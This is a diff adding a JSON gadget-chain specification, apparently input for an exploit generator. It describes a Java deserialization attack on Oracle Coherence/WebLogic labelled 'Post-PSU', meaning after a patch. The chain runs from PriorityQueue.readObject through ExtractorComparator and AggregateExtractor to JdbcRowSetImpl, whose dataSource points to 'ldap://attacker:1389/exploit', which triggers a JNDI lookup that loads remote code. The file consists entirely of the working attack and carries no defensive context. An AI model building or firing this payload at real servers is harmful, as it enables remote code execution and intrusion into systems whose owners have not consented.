@@ -1,0 +1,28 @@
+{
+  "chain_type": "Post-PSU: ExtractorComparator + reporter.AggregateExtractor → JdbcRowSetImpl JNDI",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→ExtractorComparator.compare→extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.tangosol.coherence.reporter.extractor.AggregateExtractor",
+      "field_overrides": {
+        "m_sName": "databaseMetaData",
+        "m_aoParam": [],
+        "m_nTarget": 0
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker:1389/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData→JNDI"
+}
